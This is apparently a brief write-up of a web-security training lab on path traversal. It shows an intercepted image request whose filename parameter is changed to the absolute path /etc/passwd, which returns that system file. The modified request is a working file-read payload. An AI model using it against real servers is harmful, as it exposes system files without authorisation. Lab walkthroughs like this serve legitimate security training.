Like we did in the previous lab, intercept the image load request.

<img width="805" height="452" alt="image" src="https://github.com/user-attachments/assets/ede98a51-9ef9-4a33-b852-89c6b4028a2e" />

Modify the `filename` parameter.

```http
GET /image?filename=51.jpg HTTP/2
→
GET /image?filename=/etc/passwd HTTP/2
```

<img width="402" height="499" alt="image" src="https://github.com/user-attachments/assets/6276ec19-8e61-4ba6-bff5-4e74a8a6b59f" />

Successfully retrieved the contents of `/etc/passwd` by bypassing the traversal protection using an **absolute path**.
